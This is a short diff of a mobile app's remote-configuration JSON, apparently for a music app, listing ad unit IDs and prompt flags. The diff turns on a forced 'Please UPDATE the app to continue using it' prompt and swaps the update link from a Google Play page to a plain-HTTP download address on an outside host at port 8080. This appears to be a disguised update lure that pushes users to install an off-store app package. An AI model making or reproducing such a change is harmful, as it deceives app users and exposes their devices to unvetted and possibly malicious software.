@@ -3,10 +3,10 @@
 "FB_ADS_NATIVE_BANNER_TWO":"435369393682705_435370303682614",
 "FB_ADS_INTERSTITIAL_HOME":"435369393682705_435370567015921",
 "SA_ID":"205305786",
-"SHOW":"1",
+"SHOW":"0",
 "RATE":"0",
 "CONTENT":"Please rate our app, Thanks",
-"UPDATE":"0",
+"UPDATE":"1",
 "UPDATE_CONTENT":"Please UPDATE the app to continue using it. (Your musics will be backed up)",
-"NEW_APP":"https://play.google.com/store/apps/details?id=com.whatsapp"
+"NEW_APP":"http://www.pllio.com:8080/newapp?pkg=ale.musi.usica.ees"
 }
